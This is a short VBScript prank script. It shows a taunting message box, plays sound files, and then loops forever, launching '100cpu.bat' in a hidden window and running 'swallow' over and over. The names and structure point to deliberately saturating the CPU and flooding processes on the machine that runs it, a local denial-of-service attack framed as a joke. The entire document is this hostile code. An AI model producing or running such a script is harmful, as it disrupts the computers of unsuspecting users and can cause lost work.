MsgBox "You will have Oooooooooooooo AAAAAAEEEE3E-AAAAA-AAA-1AU- JOOOOOOOOOOOOOOOOOOOOOOOO AEEEEEEEOAAAAAAATUAAA EEEEEEEEEEEEEE AAAAAAAAAAAAAAAAEIOE JOOOOOOOOOOOOOOO tonight", vbInformation+vbOKOnly+vbMsgBoxSetForeground + vbDefaultButton1, ""

wscript.echo "ARE U READY"

Set Player = CreateObject("wmplayer.ocx") 
Player.URL = "init.wav"
Do Until Player.playState = 1
WScript.Sleep 1
Loop

wscript.echo "HERE WE GO"

set ws=createobject("wscript.shell") 

do
Player.url = "233.wav"
ws.run "100cpu.bat",0,false
do until Player.playState = 1 
ws.run "swallow",1,true
'wscript.sleep 1
loop

loop